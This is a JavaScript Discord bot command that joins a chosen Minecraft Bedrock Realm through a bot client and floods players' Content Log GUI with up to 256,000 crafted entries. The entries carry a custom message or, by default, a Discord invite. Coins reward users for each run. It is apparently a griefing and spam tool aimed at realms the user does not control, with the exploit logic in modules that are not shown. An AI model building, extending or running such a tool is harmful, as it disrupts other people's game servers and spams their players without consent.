"use strict";

const bpClient = require("../../common/Client.js");
const RealmAPI = require("../../common/Realm.js");

const CoinHandler = require("../../classes/CoinSystem.js");

const { translateDisconnectMessage, generateRandomString, delay } = require("../../common/Util.js");

const map = new Map();

module.exports = {
  name: "clgmessage",
  description: "Send message by the Content Log GUI",
  dontUseDB: false, // ONLY USE IF IT DOESN'T REQUIRE ANY DATABASE CHANGES / MINECRAFT OR XBOX RELATED LINK COMMANDS
  requireLink: true,
  cooldown: 15000,
  options: [
    {
      type: 3,
      name: "input",
      description: "Realm Code or ID",
      required: true,
      min_length: 5,
      max_length: 15
    },
    {
      type: 4,
      name: "amount",
      description: "Amount of arrays",
      required: true,
      min_value: 1,
      max_value: 256000
    },
    {
      type: 4,
      name: "characteramount",
      description: "Amount of characters to put in the Content Log GUI",
      min_value: 1,
      max_value: 64
    },
    {
      type: 3,
      name: "clgmsg",
      description: "Custom message to put in the Content Log GUI",
      min_length: 1,
      max_length: 64
    },
  ],
  execute: async (interaction, args, dbUser, embed, clearCooldown) => {
    let { input, amount, characteramount, clgmsg } = args;
    const { user } = interaction;

    if (typeof clgmsg != "string" && typeof characteramount != "number") clgmsg = "discord.gg-wm8rHaVC4x"

    if (!/^[a-zA-Z0-9_.'-:]+$/.test(clgmsg)) {
      embed.description = "`clgmsg` field doesn't match the regex `/^[a-zA-Z0-9_.'-:]+$/`.\n**example clgmsg: hi-+i.am-ver't3x:/nice_t0.m3,3,t-Y0u()+bye-n0w**";

      interaction.createFollowup({ embed });

      return clearCooldown();
    }

    let address = {};

    switch (map.get(user.id)) {
      case 64:
        map.delete(user.id)
        break;
      default:
        if (map.get(user.id)) {
          embed.description = `You're already doing this.`;
          interaction.createFollowup({ embed });
          return clearCooldown();
        }
        break;
    }

    let RAPI = new RealmAPI(user.id);
    let realm = /^\d+$/.test(input) ? await RAPI.getRealmInfoByID(input) : await RAPI.getRealmInfo(input);

    embed.title = "Operation";
    embed.fields = [
      {
        id: 0,
        name: "Connection",
        value: ":yellow_circle:",
        inline: true
      },
      {
        id: 1,
        name: "Operation",
        value: ":red_circle:",
        inline: true
      }
    ];

    if (realm.status) {
      switch (realm.status) {
        case 403:
        case 404:
        case 429:
        case 500:
        case 1403:
        case 1429:
        case 1500:
          embed.description = `Operation failed\nInput: **${input}**\n${realm?.body?.errorMsg} (${realm?.body?.errorCode})`;
          break;
        case 502:
        case 504:
          embed.description = `Operation failed\nInput: **${input}**\nRealms API is currently undergoing a outage.`;
          break;
        default:
          embed.description = `Operation failed\nInput: **${input}**\nTry again later or contact support. (Status ${realm.status})`;
          break;
      }

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await interaction.createFollowup({ embed });
    }

    embed.description = `Realm Name: **${realm.name}**\nInput: **${input}**`;

    const msg = await interaction.createFollowup({ embed });

    map.set(user.id, 1);

    if (realm.expired || realm.state === "CLOSED") {
      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nRealm is ${realm.expired ? "expired" : "closed"}.`;

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await msg.edit({ embed });
    }

    let realmIP = await RAPI.getRealmIP(realm.id);

    if (realmIP.status) {
      switch (realmIP.status) {
        case 403:
        case 404:
        case 500:
        case 1429:
          embed.description = `Operation failed\nInput: **${input}**\n${realmIP?.body?.errorMsg} (${realmIP?.body?.errorCode})`;
          break;
        case 502:
        case 504:
          embed.description = `Operation failed\nInput: **${input}**\nRealms API is currently undergoing a outage.`;
          break;
        default:
          embed.description = `Operation failed\nInput: **${input}**\nTry again later or contact support. (Status ${realmIP.status})`;
          break;
      }

      map.delete(user.id);

      embed.fields[0].value = ":red_circle:";

      return await msg.edit({ embed });
    }

    switch (realmIP.networkProtocol) {
      case "NETHERNET":
      case "NETHERNET_JSONRPC":
        address.networkId = realmIP.address;
        break;
      case "DEFAULT":
        address.ip = realmIP.address?.substring(0, realmIP.address.indexOf(':'));
        address.port = Number(realmIP.address?.substring(realmIP.address.indexOf(':') + 1));
        break;
      default:
        embed.description = `Operation failed\nInput: **${input}**\nUnsupported Network Protocol: **${realmIP.networkProtocol}**`;

        embed.fields[0].value = ":red_circle:";

        map.delete(user.id);

        return await msg.edit({ embed });
    }

    let configuration = {
      ssbp: { enabled: false, type: NaN },
      transport: realmIP.networkProtocol
    };

    const client = await new bpClient(address, dbUser, realm, configuration).connect();

    let clientValue = "";
    if (typeof client === "string") {
      switch (client) {
        case "No IP":
        case "No Port":
        case "Bad IP":
        case "Bad Port":
          clientValue = `Invaild IP/Port has been provided. (${client})`;
          break;
        case "No Nethernet Network ID":
        case "Bad Nethernet Network ID":
          clientValue = `Invaild Nethernet Network ID has been provided. (${client})`;
          break;
        case "Unsupported Network Protocol":
          clientValue = `The provided Network Protocol is unsupported.`;
          break;
        case "Concurrent Operation":
          clientValue = `Someone else is currently doing a operation on this realm right now. Please try again later.`;
          break;
        case "Currently Doing Operation":
          clientValue = `You're already doing a operation on a realm right now. Please wait until that finishes before you do another one.`;
          break;
        default:
          clientValue = `Failed to connect to the realm for an unknown reason. Please try again later or ask the developer(s) for more information. (${client})`;
          break;
      }

      map.delete(user.id);

      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

      embed.fields[0].value = ":green_circle:";

      embed.fields.push({
        id: 2,
        name: "Reason",
        value: clientValue,
        inline: true
      })

      return await msg.edit({ embed, components: [] });
    }

    embed.fields[0].value = ":green_circle:";
    embed.fields[1].value = ":yellow_circle:";

    embed.description = `Started a operation on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}**`;

    await msg.edit({ embed })

    const CHandler = new CoinHandler(interaction, dbUser);
    CHandler.start();

    client.on("kick", async (packet) => {
      if (!map.get(user.id)) return;

      map.delete(user.id);

      const reward = await CHandler.reward();

      embed.fields[1].value = ":red_circle:";
      embed.description = `Operation failed on **${realm.name}**\nInput: **${input} ${/^\d+$/.test(input) ? "" : `(${realm.id})`}**\nProtocol: **${realmIP.networkProtocol}\nCoins Earned: **${reward}**`;

      if (packet.message.includes("/multiplayer/bedrock/authentication")) {
        packet.message = "Banned from Minecraft Multiplayer";
        await RAPI.cleanLinkData("Banned from Minecraft Multiplayer", false);
      }

      embed.fields.push({
        id: 2,
        name: "Reason",
        value: translateDisconnectMessage(packet),
        inline: true
      })

      return await msg.edit({ embed });
    })

    client.once("start_game", async () => {
      let CSCConfig = {
        ssbp: { enabled: false, type: 0 },
        batchOptions: { enabled: false, count: NaN },
        listeners: { enabled: true },
        // YOU HAVE TO FOLLOW THIS REGEX EXACT. NO SPECIAL COLOR CODES :(
        // /geometry\.[a-zA-Z0-9_.'-:]+/g;
        clg: { enabled: true, clgMsg: clgmsg && clgmsg.length > 0 ? `${clgmsg}.${generateRandomString(6)}` : `${generateRandomString(characteramount)}`, amount: amount + 1, characterCount: 6 },
        name: { enabled: true, value: "§4§lLESTER PRODUCTIONS ©" },
      }

      client.createSubClient(0, CSCConfig)

      await delay(6000);

      client.disconnect();
      map.delete(user.id);

      const reward = await CHandler.reward();

      embed.description += `\nCoins Earned: **${reward}**`;
      embed.fields[1].value = ":green_circle:"

      return await msg.edit({ embed });
    })
  }
};